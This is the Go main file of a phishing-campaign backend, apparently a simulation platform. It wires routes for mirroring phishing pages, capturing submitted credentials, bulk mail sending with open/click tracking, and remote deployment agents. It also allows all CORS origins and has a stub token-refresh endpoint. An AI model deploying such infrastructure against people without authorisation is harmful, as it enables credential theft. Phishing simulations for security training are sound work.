package main

import (
	"bufio"
	"context"
	"embed"
	"fmt"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"fishing-platform-backend/config"
	"fishing-platform-backend/handlers"
	"fishing-platform-backend/hostmetrics"
	"fishing-platform-backend/middleware"
	"fishing-platform-backend/models"
	"fishing-platform-backend/utils"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/bcrypt"
)

//go:embed frontend/dist
var frontendFS embed.FS

//go:embed qqwry.dat
var qqwryData []byte

func main() {
	printStartupBanner()

	// Bootstrap runtime configuration.
	ginMode, err := config.BootstrapRuntimeConfig()
	if err != nil {
		log.Fatalf("Failed to bootstrap runtime configuration: %v", err)
	}
	if !confirmInsecureSecuritySettings(config.InsecureSecuritySettings()) {
		log.Fatal("Startup aborted because insecure security configuration was not confirmed")
	}
	gin.SetMode(ginMode)

	// Initialize encryption
	encryptionKey := config.EncryptionKey()
	if err := utils.InitEncryption(encryptionKey); err != nil {
		log.Printf("Warning: Failed to initialize encryption: %v", err)
	}

	// Initialize embedded IP location database.
	if err := utils.InitIPLocationDB(qqwryData); err != nil {
		log.Printf("Warning: Failed to initialize qqwry IP database: %v", err)
	}

	// Initialize database
	dbPath := config.DatabasePath()
	if err := config.InitializeDatabase(dbPath); err != nil {
		log.Fatalf("Failed to initialize database: %v", err)
	}

	// Run database migrations
	if err := models.AutoMigrate(config.GetDB()); err != nil {
		log.Fatalf("Failed to run migrations: %v", err)
	}
	if err := handlers.SyncEnabledIPBlacklistToHostFirewall(config.GetDB()); err != nil {
		log.Printf("Warning: Failed to sync IP blacklist to host firewall: %v", err)
	}
	if _, err := handlers.EnsureMailTrackingSettingForBoot(); err != nil {
		log.Printf("Warning: mail tracking settings seed failed: %v", err)
	}

	// Background host metrics sampling (30s interval, 24h retention).
	hostMetricsCtx, hostMetricsCancel := context.WithCancel(context.Background())
	defer hostMetricsCancel()
	hostmetrics.Start(hostMetricsCtx)

	// Initialize JWT
	middleware.InitJWT()
	if config.JWTSecret() == "" {
		log.Println("JWT_SECRET is not set; generated an in-memory secret for this process")
	}

	// Create default admin user if not exists
	createDefaultAdmin()

	// Probe local Docker TCP endpoint once during startup.
	probeDockerTCPPort("127.0.0.1:2375")
	checkRequiredDockerImage()

	// Initialize Gin router
	r := gin.Default()

	// Configure CORS
	corsConfig := cors.DefaultConfig()
	corsConfig.AllowAllOrigins = true
	corsConfig.AddAllowHeaders("Authorization", "Content-Type")
	r.Use(cors.New(corsConfig))

	// Public routes
	public := r.Group("/api/auth")
	platformBasicAuth := middleware.RequirePlatformBasicAuth()
	{
		public.POST("/register/", platformBasicAuth, handlers.Register)
		public.POST("/login/", platformBasicAuth, handlers.Login)
		public.POST("/logout/", platformBasicAuth, handlers.Logout)
		public.POST("/container_token/", handlers.GetContainerToken)
	}

	// JWT refresh route
	r.POST("/api/auth/token/refresh/", platformBasicAuth, func(c *gin.Context) {
		// For simplicity, we'll just generate a new token based on the user
		// In production, you'd validate the refresh token properly
		c.JSON(http.StatusOK, gin.H{"message": "Refresh endpoint"})
	})

	agentPublic := r.Group("/api/agents")
	{
		agentPublic.POST("/register/", handlers.RegisterAgent)
		agentPublic.POST("/heartbeat/", handlers.AgentHeartbeat)
	}

	// Public mail open/click tracking via opaque /api/<slug> (paths from DB settings).
	r.GET("/api/:slug", handlers.DispatchMailTracking)

	agentRuntime := r.Group("/api/agent")
	{
		agentRuntime.GET("/tasks/lease/", handlers.LeaseAgentTasks)
		agentRuntime.POST("/tasks/:taskID/start/", handlers.StartAgentTask)
		agentRuntime.POST("/tasks/:taskID/renew/", handlers.RenewAgentTask)
		agentRuntime.POST("/tasks/:taskID/complete/", handlers.CompleteAgentTask)
		agentRuntime.GET("/deployments/:id/artifact/", handlers.DownloadDeploymentArtifact)
		agentRuntime.POST("/deployments/:id/submit/", handlers.SubmitDeploymentData)
		agentRuntime.POST("/deployments/:id/logs/", handlers.UploadDeploymentLogs)
	}

	// Protected routes
	protected := r.Group("/api")
	protected.Use(middleware.AuthMiddleware(), middleware.AuditMiddleware())
	{
		// Current user profile
		protected.GET("/auth/me/", handlers.GetCurrentUser)

		// Audit logs (admin only; read-only; no delete by design)
		auditLogs := protected.Group("/")
		auditLogs.Use(middleware.RequireAdmin())
		{
			auditLogs.GET("/audit-logs/", handlers.ListAuditLogs)
			auditLogs.GET("/audit-logs/actions/", handlers.ListAuditActions)
		}

		// User management (admin only)
		users := protected.Group("/users")
		users.Use(middleware.RequireAdmin())
		{
			users.GET("/", handlers.ListUsers)
			users.POST("/", handlers.CreateUser)
			users.PUT("/:id/", handlers.UpdateUser)
			users.POST("/:id/reset-password/", handlers.ResetUserPassword)
			users.DELETE("/:id/", handlers.DeleteUser)
		}

		// AI settings (admin only; used by page mirror rewrite)
		aiSettings := protected.Group("/ai-settings")
		aiSettings.Use(middleware.RequireAdmin())
		{
			aiSettings.GET("/", handlers.GetAISettings)
			aiSettings.PUT("/", handlers.UpdateAISettings)
		}

		// Mail tracking settings (admin only; public_base_url + tracking endpoints)
		mailTracking := protected.Group("/mail-tracking-settings")
		mailTracking.Use(middleware.RequireAdmin())
		{
			mailTracking.GET("/", handlers.GetMailTrackingSettings)
			mailTracking.PUT("/", handlers.UpdateMailTrackingSettings)
		}

		// Agents
		protected.GET("/agents/", handlers.GetAgents)
		protected.GET("/agents/:id/", handlers.GetAgent)

		// Robots (operators can manage day-to-day; deletes are admin-only)
		protected.GET("/robots/", handlers.GetRobots)
		protected.GET("/robots/:id/", handlers.GetRobot)
		protected.POST("/robots/", handlers.CreateRobot)
		protected.PUT("/robots/:id/", handlers.UpdateRobot)
		protected.POST("/robots/:id/test/", handlers.TestRobot)
		protected.GET("/robots/:id/push_logs/", handlers.GetRobotPushLogs)
		protected.POST("/robots/:id/online/", handlers.StartRobot)
		protected.POST("/robots/:id/offline/", handlers.StopRobot)
		protected.GET("/robots/:id/messages/", handlers.GetRobotMessages)
		protected.POST("/robot_push_logs/", handlers.CreateRobotPushLog)

		// Projects (operators run jobs; project deletion is admin-only)
		protected.GET("/projects/", handlers.GetProjects)
		protected.GET("/projects/:id/", handlers.GetProject)
		protected.POST("/projects/", handlers.CreateProject)
		protected.PUT("/projects/:id/", handlers.UpdateProject)
		protected.POST("/projects/:id/build/", handlers.BuildProject)
		protected.GET("/projects/:id/build_status/", handlers.BuildStatus)
		protected.GET("/projects/:id/deployments/", handlers.GetProjectDeployments)
		protected.POST("/projects/:id/deployments/:deploymentID/:action/", handlers.ControlProjectDeployment)
		protected.GET("/projects/:id/logs/", handlers.GetProjectLogs)
		protected.POST("/projects/:id/start_container/", handlers.StartContainer)
		protected.POST("/projects/:id/stop_container/", handlers.StopContainer)
		protected.POST("/projects/:id/restart_container/", handlers.RestartContainer)
		protected.POST("/projects/:id/start_local/", handlers.StartLocalFlask)
		protected.POST("/projects/:id/stop_local/", handlers.StopLocalFlask)
		protected.POST("/projects/:id/restart_local/", handlers.RestartLocalFlask)
		protected.GET("/projects/:id/container_log/", handlers.ContainerLog)
		protected.GET("/projects/:id/credentials/", handlers.GetProjectCredentials)

		// Messages
		protected.GET("/messages/", handlers.GetMessages)
		protected.GET("/messages/:id/", handlers.GetMessage)
		protected.POST("/messages/", handlers.CreateMessage)
		protected.PUT("/messages/:id/", handlers.UpdateMessage)

		// Credential capture write path (used by runtimes); global credential reads are admin-only
		protected.POST("/credentials/", handlers.CreateCredential)
		protected.PUT("/credentials/:id/", handlers.UpdateCredential)

		// IP Blacklist (operators may add/update; deletes are admin-only)
		protected.GET("/ip-blacklist/", handlers.GetIPBlacklist)
		protected.GET("/ip-blacklist/:id/", handlers.GetIPBlacklistEntry)
		protected.POST("/ip-blacklist/", handlers.CreateIPBlacklistEntry)
		protected.PUT("/ip-blacklist/:id/", handlers.UpdateIPBlacklistEntry)

		// SMTP services (operators may use/send; deletes are admin-only)
		protected.GET("/smtp-services/", handlers.GetSmtpServices)
		protected.GET("/smtp-services/:id/", handlers.GetSmtpService)
		protected.POST("/smtp-services/", handlers.CreateSmtpService)
		protected.PUT("/smtp-services/:id/", handlers.UpdateSmtpService)
		protected.POST("/smtp-services/:id/test/", handlers.TestSmtpService)
		protected.POST("/smtp-services/:id/send/", handlers.SendSmtpServiceMail)

		// Mail campaigns (workbench bulk send + tracking)
		protected.GET("/mail-campaigns/", handlers.GetMailCampaigns)
		protected.GET("/mail-campaigns/:id/", handlers.GetMailCampaign)
		protected.POST("/mail-campaigns/", handlers.CreateMailCampaign)
		protected.GET("/mail-campaigns/:id/recipients/", handlers.GetMailCampaignRecipients)
		protected.GET("/mail-campaigns/:id/events/", handlers.GetMailCampaignEvents)

		// Phishing Pages / page builder
		protected.GET("/phishing-pages/", handlers.GetPhishingPages)
		protected.POST("/phishing-pages/mirror/", handlers.MirrorPhishingPage)
		protected.POST("/phishing-pages/upsert/", handlers.UpsertPhishingPage)
		protected.GET("/phishing-pages/:id/", handlers.GetPhishingPage)
		protected.POST("/phishing-pages/", handlers.CreatePhishingPage)
		protected.PUT("/phishing-pages/:id/", handlers.UpdatePhishingPage)
		protected.DELETE("/phishing-pages/:id/", handlers.DeletePhishingPage)

		// Dashboard
		protected.GET("/dashboard/", handlers.GetStatistics)

		// Destructive / sensitive governance actions (admin only)
		adminOnly := protected.Group("/")
		adminOnly.Use(middleware.RequireAdmin())
		{
			adminOnly.DELETE("/robots/:id/", handlers.DeleteRobot)
			adminOnly.DELETE("/projects/:id/", handlers.DeleteProject)
			adminOnly.DELETE("/messages/:id/", handlers.DeleteMessage)
			adminOnly.GET("/credentials/", handlers.GetCredentials)
			adminOnly.GET("/credentials/:id/", handlers.GetCredential)
			adminOnly.DELETE("/credentials/:id/", handlers.DeleteCredential)
			adminOnly.DELETE("/ip-blacklist/:id/", handlers.DeleteIPBlacklistEntry)
			adminOnly.DELETE("/smtp-services/:id/", handlers.DeleteSmtpService)
		}
	}

	// Serve static frontend files using StaticFS
	frontendDist, err := fs.Sub(frontendFS, "frontend/dist")
	if err != nil {
		log.Fatalf("Failed to create frontend filesystem: %v", err)
	}

	// Create a static file server
	httpFS := http.FS(frontendDist)
	fileServer := http.FileServer(httpFS)

	// Serve static files with a catch-all route and cache control
	r.Any("/assets/*filepath", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
		c.Request.URL.Path = "/assets/" + c.Param("filepath")
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Next.js static export assets
	r.Any("/_next/*filepath", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
		c.Request.URL.Path = "/_next/" + c.Param("filepath")
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	r.Any("/js/*filepath", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
		c.Request.URL.Path = "/js/" + c.Param("filepath")
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	r.Any("/css/*filepath", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
		c.Request.URL.Path = "/css/" + c.Param("filepath")
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Serve favicon
	r.GET("/favicon.svg", platformBasicAuth, func(c *gin.Context) {
		c.Request.URL.Path = "/favicon.svg"
		fileServer.ServeHTTP(c.Writer, c.Request)
	})
	r.GET("/favicon.ico", platformBasicAuth, func(c *gin.Context) {
		c.Request.URL.Path = "/favicon.ico"
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Serve index.html for root path with aggressive cache control
	r.GET("/", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
		c.Header("Pragma", "no-cache")
		c.Header("Expires", "Thu, 01 Jan 1970 00:00:00 GMT")
		c.Request.URL.Path = "/"
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Handle SPA routing - serve index.html for all other non-API routes with aggressive cache control
	r.NoRoute(func(c *gin.Context) {
		// Check if it's an API request
		if strings.HasPrefix(c.Request.URL.Path, "/api") {
			c.JSON(http.StatusNotFound, gin.H{"error": "API endpoint not found"})
			return
		}

		if !middleware.EnsurePlatformBasicAuth(c) {
			return
		}

		// Serve index.html for SPA routing with aggressive cache control
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
		c.Header("Pragma", "no-cache")
		c.Header("Expires", "Thu, 01 Jan 1970 00:00:00 GMT")
		c.Request.URL.Path = "/"
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Start server
	port := fmt.Sprintf("%d", config.ServerPort())

	log.Printf("Starting server on port %s", port)
	if err := r.Run(":" + port); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}

func printStartupBanner() {
	fmt.Print(`
 /$$$$$$$$ /$$           /$$                         /$$             /$$      /$$$$$$                                 
| $$_____/|__/          | $$                        | $$            | $$     /$$__  $$                                
| $$       /$$  /$$$$$$$| $$$$$$$           /$$$$$$ | $$  /$$$$$$  /$$$$$$  | $$  \__//$$$$$$   /$$$$$$  /$$$$$$/$$$$ 
| $$$$$   | $$ /$$_____/| $$__  $$ /$$$$$$ /$$__  $$| $$ |____  $$|_  $$_/  | $$$$   /$$__  $$ /$$__  $$| $$_  $$_  $$
| $$__/   | $$|  $$$$$$ | $$  \ $$|______/| $$  \ $$| $$  /$$$$$$$  | $$    | $$_/  | $$  \ $$| $$  \__/| $$ \ $$ \ $$
| $$      | $$ \____  $$| $$  | $$        | $$  | $$| $$ /$$__  $$  | $$ /$$| $$    | $$  | $$| $$      | $$ | $$ | $$
| $$      | $$ /$$$$$$$/| $$  | $$        | $$$$$$$/| $$|  $$$$$$$  |  $$$$/| $$    |  $$$$$$/| $$      | $$ | $$ | $$
|__/      |__/|_______/ |__/  |__/        | $$____/ |__/ \_______/   \___/  |__/     \______/ |__/      |__/ |__/ |__/
                                          | $$                                                                        
                                          | $$                                                                        
                                          |__/           	Version: 1.0.0  
									                                                                                                                                                                                                                                                                                                                                                                                                                
`)
}

func confirmInsecureSecuritySettings(issues []config.InsecureSecuritySetting) bool {
	if len(issues) == 0 {
		return true
	}

	fmt.Println()
	fmt.Println("============================================================")
	fmt.Println("安全配置提醒：检测到以下敏感配置仍为默认值或为空")
	fmt.Println("============================================================")
	for _, issue := range issues {
		fmt.Printf("- %s (%s): %s\n", issue.Path, issue.Label, issue.Reason)
	}
	fmt.Println()
	fmt.Println("建议立即修改 config.yaml 中的上述配置，使用足够长的随机字符串。")
	fmt.Println("继续运行会降低平台安全性，并可能导致 token、凭据加密或 Flask 回连认证存在风险。")
	fmt.Print("如果确认仍要继续启动，请输入 y 后回车：")

	reader := bufio.NewReader(os.Stdin)
	answer, err := reader.ReadString('\n')
	if err != nil && strings.TrimSpace(answer) == "" {
		fmt.Println()
		fmt.Println("未读取到确认输入，已取消启动。")
		return false
	}

	return strings.ToLower(strings.TrimSpace(answer)) == "y"
}

func probeDockerTCPPort(address string) {
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		log.Printf("[Docker Probe] Docker TCP endpoint %s is unreachable during startup: %s", address, err.Error())
		return
	}

	_ = conn.Close()
	log.Printf("[Docker Probe] Docker TCP endpoint %s is reachable during startup", address)
}

func checkRequiredDockerImage() {
	dockerClient, err := utils.NewDockerClient()
	if err != nil {
		log.Printf("[Docker Image Check] 无法连接 Docker，跳过基础镜像检查：%v", err)
		return
	}
	defer dockerClient.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	exists, err := dockerClient.ImageExists(ctx, utils.RequiredProjectBaseImage)
	cancel()
	if err != nil {
		log.Printf("[Docker Image Check] 检查基础镜像失败：%v", err)
		return
	}
	if exists {
		log.Printf("[Docker Image Check] 已检测到基础镜像 %s", utils.RequiredProjectBaseImage)
		return
	}

	fmt.Println()
	fmt.Println("============================================================")
	fmt.Printf("缺少项目构建所需的 Docker 基础镜像：%s\n", utils.RequiredProjectBaseImage)
	fmt.Printf("可手动执行：docker pull %s\n", utils.RequiredProjectBaseImage)
	fmt.Println("============================================================")
	fmt.Print("是否现在下载该镜像？请输入 y 后回车确认：")

	reader := bufio.NewReader(os.Stdin)
	answer, readErr := reader.ReadString('\n')
	if readErr != nil && strings.TrimSpace(answer) == "" {
		fmt.Println()
		log.Printf("[Docker Image Check] 未读取到确认输入，已跳过镜像下载")
		return
	}
	if strings.ToLower(strings.TrimSpace(answer)) != "y" {
		log.Printf("[Docker Image Check] 用户未确认，已跳过镜像下载")
		return
	}

	log.Printf("[Docker Image Check] 开始下载 %s", utils.RequiredProjectBaseImage)
	pullCtx, pullCancel := context.WithTimeout(context.Background(), 30*time.Minute)
	defer pullCancel()
	if err := dockerClient.PullImage(pullCtx, utils.RequiredProjectBaseImage, os.Stdout); err != nil {
		log.Printf("[Docker Image Check] 镜像下载失败：%v", err)
		return
	}
	log.Printf("[Docker Image Check] 基础镜像 %s 下载完成", utils.RequiredProjectBaseImage)
}

// createDefaultAdmin creates a default admin user if it doesn't exist
func createDefaultAdmin() {
	db := config.GetDB()

	var admin models.User
	if err := db.Where("username = ?", "admin").First(&admin).Error; err == nil {
		if models.NormalizeRole(admin.Role) != models.UserRoleAdmin {
			_ = db.Model(&admin).Update("role", models.UserRoleAdmin).Error
		}
		log.Println("Admin user already exists")
		return
	}

	// Generate a secure password
	password := utils.GenerateSecurePassword(12)

	// Hash password
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		log.Printf("Failed to hash admin password: %v", err)
		return
	}

	admin = models.User{
		Username: "admin",
		Password: string(hashedPassword),
		Role:     models.UserRoleAdmin,
	}

	if err := db.Create(&admin).Error; err != nil {
		log.Printf("Failed to create admin user: %v", err)
		return
	}

	// Save password to file
	dbPath := config.DatabasePath()
	dataDir := dbPath[:strings.LastIndex(dbPath, "/")]
	if dataDir == "" {
		dataDir = "."
	}

	passwordFile := dataDir + "/admin_password.txt"
	content := fmt.Sprintf("Fishing Platform Admin Credentials\n================================\nUsername: admin\nPassword: %s\nGenerated: %s\n\nIMPORTANT: Please save this password and delete this file after logging in.\n",
		password, time.Now().Format("2006-01-02 15:04:05"))

	if err := os.WriteFile(passwordFile, []byte(content), 0600); err != nil {
		log.Printf("Failed to save password file: %v", err)
	} else {
		log.Printf("✅ Admin user created successfully!")
		log.Printf("Username: admin")
		log.Printf("Password: %s", password)
		log.Printf("Password saved to: %s", passwordFile)
		log.Printf("⚠️  Please save this password and delete the file after logging in!")
	}
}
